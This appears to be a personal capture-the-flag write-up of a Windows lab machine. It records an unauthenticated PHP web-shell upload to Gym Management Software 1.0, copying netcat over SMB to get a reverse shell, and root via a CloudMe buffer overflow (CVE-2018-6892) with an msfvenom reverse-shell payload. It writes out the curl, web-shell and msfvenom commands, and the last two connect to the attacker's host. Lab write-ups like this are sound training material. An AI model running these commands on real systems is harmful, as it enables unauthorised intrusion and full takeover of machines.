Main steps
1. 

Learning points
1. Uploading files to Windows server via SMB
2. Some Windows manual privesc enumeration

`nmap`
![[Pasted image 20260324194328.png]]

Ports 7680, 8080 open.

8080 leads to a website with a login bar.
![[Pasted image 20260324194352.png]]

Port 7680 is running the `pando-pub` service, which is a torrent application for transferring files.

`Feroxbuster` found a few interesting pages such as `register.php` and `upload.php`, but I am unable to access them directly.
![[Pasted image 20260324195124.png]]

On the `contact.php` page, there is a software name and version: `Gym Management Software 1.0`.
![[Pasted image 20260324195349.png]]

Googling this gives an unauthenticated file upload vulnerability leading to an RCE, by uploading a PHP file that bypasses image upload filters. By sending a POST request to the `upload.php` page with the malicious PHP file, I can get a web or reverse shell.

Based on a POC I found here https://www.exploit-db.com/exploits/48506, I crafted a `curl` request with `curl -X POST "http://10.129.25.107:8080/upload.php?id=shell" -k -F 'file=@simplephpshell.php.png' -F 'pupload=upload'` to upload a web shell to the server.
![[Pasted image 20260324200544.png]]

This successfully uploaded the file, and I was able to run commands on the web shell.
![[Pasted image 20260324200605.png]]

Tried uploading a PHP reverse shell but kept getting errors, so I launched an `SMB` server with `impacket-smbserver share . -smb2support -username test -password pass` to upload `nc64.exe` to the server for a proper reverse shell.

Ran the command `http://10.129.224.36:8080/upload/test.php?cmd=net%20use%20\\10.10.14.47\share%20/u:test%20pass` on the web shell to connect to my `SMB` server, then `http://10.129.224.36:8080/upload/test.php?cmd=copy%20\\10.10.14.47\share\nc64.exe%20\programdata\nc.exe` to copy the file over.
![[Pasted image 20260324202853.png]]

Ran `nc -e` and got a reverse shell as `shaun`.
![[Pasted image 20260324203956.png]]

Checked `netstat -ano` and saw that there is a service listening on localhost:8888.
![[Pasted image 20260324204139.png]]

Normally it would be possible to find the process using `tasklist /v | findstr PID`, but for some reason on my instance the process would change every few seconds, and the `tasklist` took too long to load, so I was unable to find the process this way. Either way, the process running on this port is `CloudMe.exe`.
![[Pasted image 20260324204641.png]]

This also matches a file found in the user's Downloads directory, `CloudMe_1112.exe`.
![[Pasted image 20260324204722.png]]

Searching up this version of `CloudMe` shows that it is vulnerable to a buffer overflow, CVE-2018-6892. There are a few POCs available, but they all do not contain privilege escalation payloads, so I will need to edit them.

First I need to forward the internal port 8888 to my machine. Did this with `chisel`.
![[Pasted image 20260324205532.png]]
![[Pasted image 20260324205539.png]]

From the POC I found on ExploitDB, the payload looks like this:
![[Pasted image 20260324210021.png]]

There is a command that was used to generate the payload in the comments, so I reused some of the parameters to generate a reverse shell payload with `msfvenom`, using `msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.47 LPORT=6666 -b '\x00\x0A\x0D' -f python -v payload`.
![[Pasted image 20260324210128.png]]

Copied the generated payload and replaced the code in the POC with it, opened a `nc` listener, and ran the exploit. Got a shell as `administrator`.
![[Pasted image 20260324210223.png]]

